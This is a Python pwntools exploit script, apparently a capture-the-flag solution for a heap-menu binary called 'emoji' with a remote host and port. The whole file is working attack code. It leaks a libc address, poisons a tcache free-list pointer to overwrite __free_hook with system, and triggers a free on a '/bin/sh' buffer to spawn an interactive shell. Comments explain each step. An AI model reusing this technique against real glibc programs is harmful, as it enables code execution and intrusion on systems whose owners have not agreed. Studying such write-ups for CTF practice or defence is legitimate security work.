#!/usr/bin/env python3

from pwn import *

the_binary = "./emoji"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc-2.31.so", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("193.57.159.27", 42588)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        # break collect_garbage
        continue
    """)

def menu(choice):
    io.sendlineafter("> ", str(choice))

def send_index(idx):
    io.sendlineafter(": ", str(idx))

def add_emoji(title, data):
    menu(1)
    io.sendafter("title: ", title)
    io.sendafter("emoji: ", data)

def read_emoji(idx):
    menu(2)
    send_index(idx)

def delete_emoji(idx):
    menu(3)
    send_index(idx)

def collect_garbage():
    menu(4)

# Get a libc pointer on the heap. We have to take some care to position it
# where we can adjust a title pointer to be able to read it.
for i in range(8):
    add_emoji(f"title.{i}", b"\xffA")

for i in range(0, 2):
    delete_emoji(i)
for i in range(4, 8):
    delete_emoji(i)
for i in range(2, 4):
    delete_emoji(i)
collect_garbage()

# We have now adjusted an entry's title pointer to point to the libc address
# in the free chunk in the unsorted bin. We can leak it by printing the title.
add_emoji("xxxx", b"\xffAAA\xe0")
read_emoji(0)
io.recvuntil("Title: ")
raw_leak = io.recvuntil("\n", drop=True)
libc_leak = u64(raw_leak.ljust(8, b"\x00"))
libc.address = libc_leak - 0x1ebbe0
log.info("libc leak: %#x" % libc_leak)
log.info("libc base: %#x" % libc.address)

# Can't free 0 any more due to corrupted title pointer.

# Set up a fake chunk that we will free, overlap with, and overwrite it's
# tcache metadata.
add_emoji(b"title.1\x00", b"\xffA")
add_emoji(b"title.2\x00", b"\xffAAA\x40")
add_emoji(b"title.3\x00" + p64(0)*4 + p64(0x91), b"\xffAAA\x70")

delete_emoji(3)
delete_emoji(2)
collect_garbage()

# Overwrite the metadata (namely, the tcache list fd pointer) of the fake
# chunk in 3's title.
add_emoji(b"A"*0x28 + p64(0x91) + p64(libc.sym.__free_hook), b"\xffA")

# Consume an allocation so the forged fd poitner is ready to go. We are also
# setting up our eventual shell.
add_emoji("/bin/sh\x00", b"\xffA")

# The next title allocation will sit on top of __free_hook, which we overwrite
# with system.
add_emoji(p64(libc.sym.system), b"\xffA")

# Trigger __free_hook("/bin/sh")
delete_emoji(3)
collect_garbage()

io.interactive()
